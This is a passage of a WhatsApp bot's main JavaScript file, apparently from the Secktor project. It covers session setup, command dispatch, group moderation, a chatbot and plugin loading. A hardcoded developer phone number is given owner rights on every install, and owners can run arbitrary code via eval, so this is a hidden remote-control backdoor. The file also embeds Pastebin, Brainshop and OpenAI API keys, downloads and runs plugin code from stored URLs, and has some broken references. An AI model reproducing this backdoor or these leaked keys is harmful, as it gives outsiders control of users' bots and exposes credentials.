const Config = require('../config');
const fs = require('fs-extra');
const axios = require('axios');
const FileType = require('file-type');
const path = require('path');
const express = require('express');
const app = express();
const prefix = Config.HANDLERS[0];
const mongoose = require('mongoose');
const { writeFile } = require('fs/promises');
const events = require('./commands');
const PhoneNumber = require('awesome-phonenumber');
const {
	imageToWebp,
	videoToWebp,
	writeExifImg,
	writeExifVid,
} = require('./exif');
const {
	default: VoidConnect,
	proto,
	downloadContentFromMessage,
	useMultiFileAuthState,
	generateForwardMessageContent,
	generateWAMessageFromContent,
	makeInMemoryStore,
	makeCacheableSignalKeyStore,
	jidDecode,
	Browsers,
	fetchLatestBaileysVersion,
} = require('@whiskeysockets/baileys');
const util = require('util');
const {
	sck1,
	plugindb,
	sleep,
	getBuffer,
	clockString,
	getSizeMedia,
	tlang,
} = require('../lib');
const { smsg } = require('../lib/myfuncn');
const {} = require('../lib');
global.db = JSON.parse(fs.readFileSync(__dirname + '/database.json'));
const { envlogger } = require('./logger.js');
var prefixRegex =
	Config.prefix === 'false' || Config.prefix === 'null'
		? '^'
		: new RegExp('^[' + Config.HANDLERS + ']');
		
		async function MakeSession() {
			try {
				const filePath = __dirname + '/auth_info_baileys/creds.json';
		

				if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
					if (Config.sessionName.length > 30) {
			
						const fetchit = Config.sessionName;
						const remsession = Buffer.from(fetchit.replace("Secktor;;;", ""), 'base64').toString('utf-8');
						await fs.writeFileSync(
							__dirname + '/auth_info_baileys/creds.json',
							remsession,
							'utf8',
						);
						
						console.log('Session file created successfully (short session).');
					} else {
						
						const fetchit = Config.sessionName;
						const remsession = Buffer.from(fetchit.slice(10), 'base64').toString('utf-8');
						const PastebinAPI = require('pastebin-js');
						const pastebin = new PastebinAPI('5f4ilKJVJG-0xbJTXesajw64LgSAAo-L');
						await pastebin.getPaste(remsession).then(async (data) => {
						
							await fs.writeFileSync(filePath, data, 'utf8');
							console.log('Session file created successfully (Pastebin session).');
						}).catch((error) => {
							console.error('Error fetching session data from Pastebin:', error);
						});
					}
				} else {
					console.log('Session file already exists.');
				}
			} catch (error) {
				console.error('Error while creating session:', error);
			}
		}
		
MakeSession();
setTimeout(() => {
	const moment = require('moment-timezone');
	async function main() {
		if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
		}
		try {
			await mongoose.connect(mongodb);
		} catch {
			console.log(
				'Could not connect with Mongodb.\nPlease visit https://secktorbot.tech/wiki',
			);
		}
	}
	main();

	const Pino = require('pino');
	const logger = {
		level: 'silent',
		log: () => {},
		info: () => {},
		error: () => {},
		warn: () => {},
		debug: () => {},
		trace: () => {},
		child: () => logger,
	};
	const store = makeInMemoryStore({
		logger: Pino({
			level: 'silent',
		}).child({
			level: 'silent',
		}),
	});
	try {
		if (fs.existsSync(__dirname + '/store.json')) {
			store.readFromFile(__dirname + '/store.json');
		}
	} catch (e) {
		console.log('Store Error:\n', e);
	}
	require('events').EventEmitter.defaultMaxListeners = 2000;

	async function syncdb() {
		await envlogger();
		let thumbbuffer = await getBuffer(THUMB_IMAGE);
		const ChangePic = __dirname + '/assets/SocialLogo.png';
		await writeFile(ChangePic, thumbbuffer);
		global.log0 = fs.readFileSync(__dirname + '/assets/SocialLogo.png'); //ur logo pic
		const { state, saveCreds } = await useMultiFileAuthState(
			__dirname + '/auth_info_baileys/',
		);

		const { version, isLatest } = await fetchLatestBaileysVersion();

		const sock = VoidConnect({
			version: version,
			printQRInTerminal: true,
			fireInitQueries: true,
			shouldSyncHistoryMessage: true,
			downloadHistory: true,
			syncFullHistory: true,
			generateHighQualityLinkPreview: true,
			markOnlineOnConnect: false,
			defaultQueryTimeoutMs: undefined,
			logger: logger,
			Browsers: Browsers.macOS('Desktop'),
			auth: {
				creds: state.creds,
				keys: makeCacheableSignalKeyStore(state.keys, logger),
			},
			linkPreviewImageThumbnailWidth: 1980,
			generateHighQualityLinkPreview: true,
		});

		store.bind(sock.ev);
		setInterval(() => {
			store.writeToFile(__dirname + '/store.json');
		}, 30 * 1000);

		sock.ev.on('messages.upsert', async chatUpdate => {
			const mek = chatUpdate.messages[0];
			if (!mek.message) return;
			if (mek.message.viewOnceMessageV2) return;
			mek.message =
				Object.keys(mek.message)[0] === 'ephemeralMessage'
					? mek.message.ephemeralMessage.message
					: mek.message;
			if (
				mek.key &&
				mek.key.remoteJid === 'status@broadcast' &&
				Config.auto_read_status === 'true'
			) {
				await sock.readMessages([mek.key]);
			}
			const botNumber = await sock.decodeJid(sock.user.id);
			if (
				mek.key &&
				mek.key.remoteJid === 'status@broadcast' &&
				Config.auto_status_saver == true
			) {
				// Media Message handling for status
				if (mek.message.extendedTextMessage) {
					let cap = mek.message.extendedTextMessage.text;
					await sock.sendMessage(
						botNumber,
						{
							text: cap,
						},
						{
							quoted: mek,
						},
					);
				} else if (mek.message.imageMessage) {
					let cap = mek.message.imageMessage.caption;
					let anu = await sock.downloadAndSaveMediaMessage(
						mek.message.imageMessage,
					);
					await sock.sendMessage(
						botNumber,
						{
							image: {
								url: anu,
							},
							caption: cap,
						},
						{
							quoted: mek,
						},
					);
				} else if (mek.message.videoMessage) {
					let cap = mek.message.videoMessage.caption;
					let anu = await sock.downloadAndSaveMediaMessage(
						mek.message.videoMessage,
					);
					await sock.sendMessage(
						botNumber,
						{
							video: {
								url: anu,
							},
							caption: cap,
						},
						{
							quoted: mek,
						},
					);
				}
			}

			// Status Updates
			if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
			try {
				let citel = await smsg(
					sock,
					JSON.parse(JSON.stringify(mek)),
					store,
				);
				
				if (!citel.message) return;
				if (citel.isBaileys) return;
				if (citel.chat.endsWith('broadcast')) return;
				if (Config.alwaysonline === 'true') {
					sock.sendPresenceUpdate('available', citel.chat);
				}
				var { body } = citel;
				var budy =
					typeof citel.text == 'string' ? citel.text : false;

				if (body[1] && body[1] == ' ')
					body = body[0] + body.slice(2);
				let icmd = body ? prefixRegex.test(body[0]) : false;
				if (Config.readmessage === 'true' && icmd) {
					await sock.readMessages([mek.key]);
				}
				const args = citel.body
					? body.trim().split(/ +/).slice(1)
					: null;
				const hgg = botNumber.split('@')[0];
				const quoted = citel.quoted ? citel.quoted : citel;
				const mime = (quoted.msg || quoted).mimetype || '';
				let devss = '919628516236';
				if (
					citel.chat === '120363025246125888@g.us' &&
					citel.sender !== '919628516236@s.whatsapp.net'
				)
					return;
				let isCreator = [hgg, devss, Config.OWNER_NUMBER]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(citel.sender);
				if (
					!isCreator &&
					Config.disablepm === 'true' &&
					icmd &&
					!citel.isGroup
				)
					return;

					if (citel.isGroup) {
						let userId = citel.sender;
						let userName = citel.pushName;
						let groupId = citel.chat;
						
					
						const existingUser = await sck1.findOne({ id: userId });
						if (!existingUser) {
							
							await new sck1({
								id: userId,
								name: userName,
								messages: 1,
								xp: Math.floor(Math.random() * 10) + 10,
								groups: { [groupId]: 1 }, 
							}).save();
							
						} else {
						
							const xpIncrement = Math.floor(Math.random() * 10) + 10;
					
							existingUser.groups = existingUser.groups || {};
					
							existingUser.groups[groupId] = (existingUser.groups[groupId] || 0) + 1;
					
							const nextLevelXp = 5 * Math.pow((existingUser.level || 0) + 1, 2) +
												50 * ((existingUser.level || 0) + 1) + 100;
							let levell = existingUser.level || 0;
							if (existingUser.xp >= nextLevelXp) {
								levell += 1;
							
							}
					
							await sck1.updateOne({ id: userId }, {
								name: userName,
								messages: (existingUser.messages || 0) + 1,
								xp: (existingUser.xp || 0) + xpIncrement,
								groups: existingUser.groups, 
								level: levell,
							});
						}
					}
					
					  
const isCommandInDatabase = async (groupId, commandName) => {
    const group = await sck.findOne({ id: groupId });
    return group?.publicCommands?.has(commandName) || false;
};

let group = citel.isGroup ? await sck.findOne({ id: citel.chat }) : null;
const cmdName = icmd? body.slice(1).trim().split(' ')[0].toLowerCase(): false;
				
if (!isCreator && citel.isGroup && icmd && !(await isCommandInDatabase(citel.chat, cmdName)))
    return 

if (!isCreator && !citel.isGroup && icmd)
    return 

				
				if (!isCreator) {
					let checkban =
						(await sck1.findOne({ id: citel.sender })) ||
						(await sck1.updateOne(
							{ id: citel.sender },
							{ name: citel.pushName },
						));
					let checkg =
						(await sck.findOne({ id: citel.chat })) ||
						(await new sck({ id: citel.chat }).save());
					if (checkg.botenable === 'false') return;
					if (icmd && checkban.ban !== 'false')
						return citel.reply(
							`*Hii ${citel.pushName},*\n_You are banned ❌ from using commands._\n_Please contact owner for further information._`,
						);
				}
			
				if (icmd) {
    const cmd = events.commands.find(
        (cmd) =>
            cmd.pattern === cmdName ||
            (cmd.alias && cmd.alias.includes(cmdName))
    );

    if (cmd) {
        const isCreator = [hgg, devss, Config.OWNER_NUMBER]
            .map((v) => `${v.replace(/[^0-9]/g, '')}@s.whatsapp.net`)
            .includes(citel.sender);

        if (cmd.react) citel.react(cmd.react);

        const text = citel.body
            ? body.trim().split(/ +/).slice(1).join(' ')
            : null;

        try {
            cmd.function(sock, citel, text, {
                args,
                isCreator,
                body,
                budy,
            });
        } catch (e) {
            console.error('[ERROR]', e);
        }
    }
}

				   const executeCommand = (command, condition) => {
    if (condition) {
        command.function(sock, citel, args, {
            isCreator,
            icmd,
            body,
            budy,
        });
    }
};

events.commands.forEach(async (command) => {
    switch (command.on) {
        case 'body':
            executeCommand(command, body);
            break;
        case 'text':
            executeCommand(command, citel.text);
            break;
        case 'image':
        case 'photo':
            executeCommand(command, citel.mtype === 'imageMessage');
            break;
        case 'sticker':
            executeCommand(command, citel.mtype === 'stickerMessage');
            break;
        default:
            break;
    }
});

  


				const groupMetadata = citel.isGroup
    ? await sock.groupMetadata(citel.chat).catch(() => null)
    : null;

const participants = groupMetadata?.participants || [];

const getGroupAdmins = (participants) => {
    return participants
        .filter((participant) => participant.admin !== null)
        .map((participant) => participant.id);
};

const groupAdmins = citel.isGroup ? getGroupAdmins(participants) : [];
const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;

				// if (citel.isGroup) {
				// 	console.log(
				// 		'Message in Group\nIn=> ' +
				// 			groupMetadata.subject +
				// 			' ' +
				// 			citel.sender +
				// 			'\nMessage:' +
				// 			citel.body +
				// 			'\n----------------------------',
				// 	);
				// }
				// if (!citel.isGroup) {
				// 	console.log(
				// 		'Message in Personal\nFrom=> ' +
				// 			citel.pushName +
				// 			' ' +
				// 			citel.sender +
				// 			'\nMessage:' +
				// 			citel.body +
				// 			'\n----------------------------',
				// 	);
				// }
				setInterval(() => {
					fs.writeFileSync(
						__dirname + '/database.json',
						JSON.stringify(global.db, null, 2),
					);
				}, 10000);
try {
    let GroupS = await sck.findOne({ id: citel.chat });
    if (GroupS) {
        let mongoschema = GroupS.antilink || 'false';
        let jackpot = budy.toLowerCase();

        if (citel.isGroup && !isAdmins && mongoschema === 'true') {
            const array = Config.antilink.split(',');
            for (let bg of array) {
                let pattern = new RegExp(`\\b${bg}\\b`, 'ig');
                if (pattern.test(jackpot)) {
                    if (!isBotAdmins) {
                        await sock.sendMessage(citel.chat, {
                            text: `*---  Link detected  ---*\n@${citel.sender.split('@')[0]} detected sending a link.\nPromote ${tlang().title} as admin to kick link senders.`,
                            mentions: [citel.sender],
                            headerType: 4,
                        });
                        return;
                    }
                    const response = await sock.groupInviteCode(citel.chat);
                    const groupLink = `chat.whatsapp.com/${response}`;
                    if (jackpot.includes(groupLink)) {
                        citel.reply(`I won't remove you for sending this group link.`);
                        return;
                    }

                    const key = {
                        remoteJid: citel.chat,
                        fromMe: false,
                        id: citel.id,
                        participant: citel.sender,
                    };
                    await sock.sendMessage(citel.chat, { delete: key });
                    citel.reply('Group Link Detected!!');

                    try {
                        await sock.groupParticipantsUpdate(citel.chat, [citel.sender], 'remove');
                    } catch {
                        citel.reply(`*Link Detected*\n${tlang().botAdmin}`);
                    }
                    return; 
                }
            }
        }
    }
} catch (err) {
    console.error(err);
}

				const { chatbot } = require('../lib/');
				let checkbot =
					(await chatbot.findOne({ id: 'chatbot' })) ||
					(await new chatbot({ id: 'chatbot' }).save());
				let checkon = checkbot.worktype;
				if (checkon === 'true' && !icmd) {
					console.log('chatbot is on');
					if (citel.key.fromMe) return;
					let zx = citel.text.length;
					try {
						if (citel.isGroup && !citel.quoted && !icmd)
							return;
						if (citel.text && !citel.isGroup) {
							if (zx < 25) {
								var diffuser =
									citel.sender.split('@')[0];
								let fetchk = require('node-fetch');
								var textuser = budy;
								let fetchtext = await fetchk(
									`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${textuser}]`,
								);
								let json = await fetchtext.json();
								let { cnt } = json;
								citel.reply(cnt);
								console.log(
									'CHATBOT RESPONSE\n' +
										'text=>' +
										textuser +
										'\n\nResponse=>' +
										cnt,
								);
								return;
							}
							const {
								Configuration,
								OpenAIApi,
							} = require('openai');
							const configuration = new Configuration({
								apiKey:
									Config.OPENAI_API_KEY ||
									'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',
							});
							const openai = new OpenAIApi(configuration);
							const completion =
								await openai.createCompletion({
									model: 'text-davinci-002',
									prompt: budy,
									temperature: 0.5,
									max_tokens: 80,
									top_p: 1.0,
									frequency_penalty: 0.5,
									presence_penalty: 0.0,
									stop: ['"""'],
								});
							citel.reply(completion.data.choices[0].text);
						} else if (
							citel.text &&
							!icmd &&
							citel.isGroup &&
							citel.quoted
						) {
							let mention = citel.mentionedJid
								? citel.mentionedJid[0]
								: citel.msg.contextInfo.participant ||
								  false;
							if (mention && !mention.includes(botNumber))
								return;
							if (zx < 20) {
								var diffuser =
									citel.sender.split('@')[0];
								let fetchk = require('node-fetch');
								let fetchtext = await fetchk(
									`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${citel.text}]`,
								);
								let json = await fetchtext.json();
								let { cnt } = json;
								console.log(cnt);
								citel.reply(cnt);
								return;
							}
							//	if (!querie && !quoted) return citel.reply(`Hey there! ${pushname}. How are you doing these days?`);
							const {
								Configuration,
								OpenAIApi,
							} = require('openai');
							const configuration = new Configuration({
								apiKey:
									Config.OPENAI_API_KEY ||
									'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',
							});
							const openai = new OpenAIApi(configuration);
							//	let textt = text ? text : citel.quoted && citel.quoted.text ? citel.quoted.text : citel.text;
							const completion =
								await openai.createCompletion({
									model: 'text-davinci-002',
									prompt: budy,
									temperature: 0.5,
									max_tokens: 80,
									top_p: 1.0,
									frequency_penalty: 0.5,
									presence_penalty: 0.0,
									stop: ['"""'],
								});
							citel.reply(completion.data.choices[0].text);
						}
						return;
					} catch (err) {
						console.log(err);
					}
				}
				var array = Config.antibadword.split(',');
				array.map(async reg => {
					if (isAdmins) return;
					let pattern = new RegExp(`\\b${reg}\\b`, 'ig');
					let chab = budy.toLowerCase();
					if (pattern.test(chab)) {
						await new Promise(r => setTimeout(r, 1000));
						try {
							const { warndb } = require('.');
							const timesam = moment(moment()).format(
								'HH:mm:ss',
							);
							moment.tz
								.setDefault('Asia/KOLKATA')
								.locale('id');
							await new warndb({
								id: citel.sender.split('@')[0] + 'warn',
								reason: 'For using Bad Word',
								group: groupMetadata.subject,
								warnedby: tlang().title,
								date: timesam,
							}).save();
							citel.reply(`
*_hey ${citel.pushName}_*\n
Warning!! Bad word detected.
delete your message.
`);
							sleep(3000);
							const key = {
								remoteJid: citel.chat,
								fromMe: false,
								id: citel.id,
								participant: citel.sender,
							};
							await sock.sendMessage(citel.chat, {
								delete: key,
							});
						} catch (e) {
							console.log(e);
						}
					}
					return;
				});
				try {
					let isNumber = x => typeof x === 'number' && !isNaN(x);
					let user = global.db.users[citel.sender];
					if (typeof user !== 'object')
						global.db.users[citel.sender] = {};
					if (user) {
						if (!isNumber(user.afkTime)) user.afkTime = -1;
						if (!('afkReason' in user)) user.afkReason = '';
					} else
						global.db.users[citel.sender] = {
							afkTime: -1,
							afkReason: '',
						};
					let chats = global.db.chats[citel.chat];
					if (typeof chats !== 'object')
						global.db.chats[citel.chat] = {};
					if (chats) {
						if (!('mute' in chats)) chats.mute = false;
						if (!('wame' in chats)) chats.wame = false;
					} else
						global.db.chats[citel.chat] = {
							mute: false,
							wame: false,
						};
				} catch (err) {
					console.error(err);
				}
				//responce
				let mentionUser = [
					...new Set([
						...(citel.mentionedJid || []),
						...(citel.quoted ? [citel.quoted.sender] : []),
					]),
				];
				for (let jid of mentionUser) {
					let user = global.db.users[jid];
					if (!user) continue;
					let afkTime = user.afkTime;
					if (!afkTime || afkTime < 0) continue;
					let reason = user.afkReason || '';
					reply(
						`
Hello ${citel.pushName} \n\n, this is *${tlang().title}* a bot.
Don't tag him,he is busy now. But Don't worry I assure you,I'll inform him As soon as possible😉.
${reason ? 'with reason ' + reason : 'no reason'}
Its been ${clockString(new Date() - afkTime)}\n\nThanks\n*Powered by ${
							tlang().title
						}*
`.trim(),
					);
				}
				if (db.users[citel.sender].afkTime > -1) {
					let user = global.db.users[citel.sender];
					reply(
						`
${tlang().greet} came back online from AFK${
							user.afkReason
								? ' after ' + user.afkReason
								: ''
						}
In ${clockString(new Date() - user.afkTime)}
`.trim(),
					);
					user.afkTime = -1;
					user.afkReason = '';
				}
				if (isCreator && citel.text.startsWith('>')) {
					let code = budy.slice(2);
					if (!code) {
						citel.reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							citel.reply(util.format(resultTest));
						else citel.reply(util.format(resultTest));
					} catch (err) {
						citel.reply(util.format(err));
					}
					return;
				}
				if (isCreator && citel.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						citel.reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else citel.reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else citel.reply(util.format(err));
					}
					return;
				}
			} catch (e) {
				console.log('An Error Occured in Status:', e);
			}
		});

		// Handling Group Mutation
		const { sck } = require('.');
		async function startcron(time, chat, type) {
			let cron = require('node-cron');
			console.log(time);
			console.log(chat);
			console.log(type);
			let [hr, min] = time.split(':');
			var j;
			if (type === 'mute') j = 'announcement';
			if (type === 'unmute') j = 'not_announcement';
			cron.schedule(
				`${min} ${hr} * * *`,
				() => {
					(async () => {
						return await sock.groupSettingUpdate(chat, j);
					})();
				},
				{
					scheduled: true,
					timezone: 'Asia/Kolkata',
				},
			);
		}

		async function foo() {
			let bar = await sck.find({});
			for (let i = 0; i < bar.length; i++) {
				if (bar[i].mute === 'false') continue;
				if (bar[i].mute === undefined) continue;
				await startcron(bar[i].mute, bar[i].id, 'mute');
			}
		}
		async function fooz() {
			let barz = await sck.find({});
			for (let i = 0; i < barz.length; i++) {
				if (barz[i].unmute === 'false') continue;
				if (barz[i].unmute === undefined) continue;
				await startcron(barz[i].unmute, barz[i].id, 'unmute');
			}
		}
		foo();
		fooz();

		// Handling AutoBio
		if (Config.autobio == true) {
			console.log('changing about');
			let cron = require('node-cron');
			cron.schedule(
				'1 * * * *',
				async () => {
					async function updateStatus() {
						const { fetchJson } = require('../lib');
						var q = '`';
						var resultt = await fetchJson(
							`https://api.popcat.xyz/pickuplines`,
						);
						var textt = resultt.pickupline;
						var time = moment().format('HH:mm');
						moment.tz.setDefault('Asia/Kolkata').locale('id');
						var date = moment
							.tz('Asia/Kolkata')
							.format('DD/MM/YYYY');
						var status = `${textt} \n⏰Time: ${time} \n🚀𝐒𝚵𝐂𝐊𝚻𝚯𝚪 𝚩𝚯𝚻`;
						await sock.updateProfileStatus(status);
					}
					await updateStatus();
				},
				{
					scheduled: true,
					timezone: 'Asia/Kolkata',
				},
			);
		}

		sock.ev.on('group-participants.update', async anu => {
			try {
				let metadata = await sock.groupMetadata(anu.id);
				let participants = anu.participants;
				for (let num of participants) {
					var ppuser;
					try {
						ppuser = await sock.profilePictureUrl(
							num,
							'image',
						);
					} catch {
						ppuser =
							'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg';
					}
					if (Config.antifake != '') {
						var array = Config.antifake.split(',') || '92';
						for (let i = 0; i < array.length; i++) {
							let chab = require('awesome-phonenumber')(
								'+' + num.split('@')[0],
							).getCountryCode();
							if (chab === array[i]) {
								console.log(array[i]);
								try {
									sock.sendMessage(anu.id, {
										text: `${chab} is not allowed`,
									});
									return await sock.groupParticipantsUpdate(
										anu.id,
										[num],
										'remove',
									);
								} catch {
									console.log('error');
								}
							}
						}
					}
					if (anu.action === 'add') {
						const { akickList } = require(__dirname + '/../lib/database/autokick');
						const newParticipant = anu.participants[0];
                        const isInAkickList = await akickList(anu.id, newParticipant);
						if (isInAkickList) {
							console.log(`User ${newParticipant} is in the akick list. Removing them...`);
							await sock.groupParticipantsUpdate(anu.id, [newParticipant], 'remove');
							return; 
						}
					}
					  
let checkinfo = await sck.findOne({ id: anu.id });
if (!checkinfo || checkinfo.events === 'false') return;

const getnum = teks => teks.replace(/['@s whatsapp.net']/g, ' ');
const sendMessage = async (id, message) => await sock.sendMessage(id, message);

const prepareMessage = async (template, metadata, num, type) => {
    const replacements = {
        '@user': `@${num.split('@')[0]}`,
        '@gname': metadata.subject,
        '@desc': metadata.desc,
        '@count': metadata.participants.length,
    };

    let message = template.replace(/@user|@gname|@desc|@count/g, match => replacements[match]);
    let ppUrl = type === 'add' || type === 'remove' ? ppuser : await sock.profilePictureUrl(num, 'image').catch(() => 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png');
    
    if (/@pp/g.test(message)) {
        return {
            image: { url: ppUrl },
            caption: message.trim().replace(/@pp/g, ''),
            footer: `${Config.botname}`,
            mentions: [num],
            headerType: 4,
        };
    } else {
        return {
            text: message.trim(),
            mentions: [num],
        };
    }
};

switch (anu.action) {
    case 'add': {
        const message = await prepareMessage(checkinfo.welcome, metadata, num, 'add');
        sendMessage(anu.id, message);
        break;
    }
    case 'remove': {
        const message = await prepareMessage(checkinfo.goodbye, metadata, num, 'remove');
        sendMessage(anu.id, message);
        break;
    }
    case 'promote': {
        let ppUrl = await sock.profilePictureUrl(num, 'image').catch(() => 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png');
        let buttonMessage = {
            image: { url: ppUrl },
            caption: `[ PROMOTE - DETECTED ]\n\nName : @${num.split('@')[0]}\nStatus : Member -> Admin\nGroup : ${metadata.subject}`,
            footer: `Secktor`,
            mentions: [num],
            headerType: 4,
        };
        sendMessage(anu.id, buttonMessage);
        break;
    }
    case 'demote': {
        let ppUrl = await sock.profilePictureUrl(num, 'image').catch(() => 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png');
        let buttonMessage = {
            image: { url: ppUrl },
            caption: `[ DEMOTE - DETECTED ]\n\nName : @${num.split('@')[0]}\nStatus : Admin -> Member`,
            footer: `Secktor`,
            mentions: [num],
            headerType: 4,
        };
        sendMessage(anu.id, buttonMessage);
        break;
    }
}


				}
			} catch (err) {
				console.log(err);
			}
		});

		sock.decodeJid = jid => {
			if (!jid) return jid;
			if (/:\d+@/gi.test(jid)) {
				let decode = jidDecode(jid) || {};
				return (
					(decode.user &&
						decode.server &&
						decode.user + '@' + decode.server) ||
					jid
				);
			} else return jid;
		};

		// Contacts Upserts
		sock.ev.on('contacts.upsert', contacts => {
			const contactsUpsert = newContacts => {
				for (const contact of newContacts) {
					if (store.contacts[contact.id]) {
						Object.assign(
							store.contacts[contact.id],
							contact,
						);
					} else {
						store.contacts[contact.id] = contact;
					}
				}
				return;
			};
			contactsUpsert(contacts);
		});

// Contacts Partial Updates
sock.ev.on('contacts.update', async update => {
    for (let contact of update) {
        const id = sock.decodeJid(contact.id);
        const contactName = contact.notify;

        try {
            // const existingUser = await sck1.findOne({ id });
            // if (!existingUser) {
            //     await new sck1({ id, name: contactName }).save();
            // } else {
            //     await sck1.updateOne({ id }, { name: contactName });
            // }

            if (store && store.contacts) {
                store.contacts[id] = { id, name: contactName };
            }
        } catch (error) {
            console.error(`Error updating contact: ${id}`, error);
        }
    }
});

// Get Name of jid
sock.getName = async (jid, withoutContact = false) => {
    const id = sock.decodeJid(jid);
    withoutContact = sock.withoutContact || withoutContact;

    let contactInfo;

    if (id.endsWith('@g.us')) {
        try {
            const groupMeta = store.contacts[id] || (await sock.groupMetadata(id));
            return (
                groupMeta.name ||
                groupMeta.subject ||
                PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
            );
        } catch {
            return 'Unknown Group';
        }
    }

    contactInfo =
        id === '0@s.whatsapp.net'
            ? { id, name: 'WhatsApp' }
            : id === sock.decodeJid(sock.user.id)
            ? sock.user
            : store.contacts[id] || {};

    return (
        (withoutContact ? '' : contactInfo.name) ||
        contactInfo.subject ||
        contactInfo.verifiedName ||
        PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
    );
};


		// Vcard Functionality
		sock.sendContact = async (jid, kon, quoted = '', opts = {}) => {
			let list = [];
			for (let i of kon) {
				list.push({
					displayName: await sock.getName(i + '@s.whatsapp.net'),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await sock.getName(
						i + '@s.whatsapp.net',
					)}\nFN:${
						global.OwnerName
					}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
						global.email
					}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
						global.github
					}/Secktor-Md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
						global.location
					};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
				});
			}
			sock.sendMessage(
				jid,
				{
					contacts: {
						displayName: `${list.length} Contact`,
						contacts: list,
					},
					...opts,
				},
				{ quoted },
			);
		};

		// Status aka brio
		sock.setStatus = status => {
			sock.query({
				tag: 'iq',
				attrs: {
					to: '@s.whatsapp.net',
					type: 'set',
					xmlns: 'status',
				},
				content: [
					{
						tag: 'status',
						attrs: {},
						content: Buffer.from(status, 'utf-8'),
					},
				],
			});
			return status;
		};
		sock.serializeM = citel => smsg(sock, citel, store);

		sock.ev.on('connection.update', async update => {
			const { connection, lastDisconnect } = update;
			if (connection === 'connecting') {
				console.log('ℹ️ Connecting to WhatsApp... Please Wait.');
			}
			if (connection === 'open') {
				console.log('✅ Login Successful!');
				console.log('⬇️  Installing External Plugins...');
				let axios = require('axios');
				async function installPlugins() {
					let check = await plugindb.find({});
					for (let i = 0; i < check.length; i++) {
						try {
							let AxiosData = await axios.get(check[i].url);
							let data = AxiosData.data;
							await fs.writeFileSync(
								__dirname + '/../commands/' + check[i].id + '.js',
								data,
								'utf8',
							);
						} catch (error) {
							console.error(`Failed to download plugin ${check[i].id}:`, error);
							await plugindb.deleteOne({ id: check[i].id });
							continue;
						}
					}
				
					console.log('✅  External Plugins Installed!');
				
					fs.readdirSync(__dirname + '/../commands').forEach(
						async (plugin) => {
							if (path.extname(plugin).toLowerCase() == '.js') {
								try {
									require(__dirname + '/../commands/' + plugin);
								} catch (error) {
									console.error(`Failed to require plugin ${plugin}:`, error);
									await plugindb.deleteOne({ id: path.basename(plugin, '.js') });
									fs.unlinkSync(__dirname + '/../commands/' + plugin);
								}
							}
						},
					);
				}
				
				installPlugins();
for (let i of owner) {
    const getStatus = (configKey, label) => {
        const value = Config[configKey];
        return `${label}: ${
            value === false || value === undefined || value === 'false' ? '❌' : '✅'
        }`;
    };

    const read = getStatus('readmessage', 'Read Message');
    const ars = getStatus('auto_read_status', 'Auto Read Status');
    const dp = getStatus('disablepm', 'Disable PM');
    const oak = getStatus('OPENAI_API_KEY', 'OPENAI KEY');
    const ar = getStatus('autoreaction', 'Auto Reaction');

    const messageText = `_Secktor has been integrated._\n` +
        `_Mode: ${Config.WORKTYPE}_\n` +
        `_Version: 0.0.9_\n` +
        `_Branch: ${Config.BRANCH}_\n` +
        `_Theme: ${Config.LANG}_\n` +
        `_Prefix: ${prefix}_\n` +
        `_Owner: ${process.env.OWNER_NAME}_\n\n` +
        `*Extra Configurations:*\n${read}\n${ars}\n${dp}\n${oak}\n${ar}`;

    sock.sendMessage(`${i}@s.whatsapp.net`, { text: messageText });
}

			}
			if (
				connection === 'close' &&
				lastDisconnect &&
				lastDisconnect.error
			) {
				console.log(
					'Connection closed with bot. Please put New Session ID again.',
				);
				await sleep(50000);
				syncdb().catch(err => console.log(err));
			}
		});
		sock.ev.on('creds.update', saveCreds);

		/**
		 *
		 * @param {*} jid
		 * @param {*} path
		 * @param {*} caption
		 * @param {*} quoted
		 * @param {*} options
		 * @returns
		 */
		//========================================================================================================================================
		sock.sendImage = async (
			jid,
			path,
			caption = '',
			quoted = '',
			options,
		) => {
			let buffer = Buffer.isBuffer(path)
				? path
				: /^data:.*?\/.*?;base64,/i.test(path)
				? Buffer.from(path.split`,`[1], 'base64')
				: /^https?:\/\//.test(path)
				? await await getBuffer(path)
				: fs.existsSync(path)
				? fs.readFileSync(path)
				: Buffer.alloc(0);
			return await sock.sendMessage(
				jid,
				{ image: buffer, caption: caption, ...options },
				{ quoted },
			);
		};

		/**
		 *
		 * @param {*} jid
		 * @param {*} path
		 * @param {*} quoted
		 * @param {*} options
		 * @returns
		 */
		//========================================================================================================================================
		sock.sendImageAsSticker = async (jid, buff, options = {}) => {
			let buffer;
			if (options && (options.packname || options.author)) {
				buffer = await writeExifImg(buff, options);
			} else {
				buffer = await imageToWebp(buff);
			}
			await sock.sendMessage(
				jid,
				{ sticker: { url: buffer }, ...options },
				options,
			);
		};
		/**
		 *
		 * @param {*} jid
		 * @param {*} path
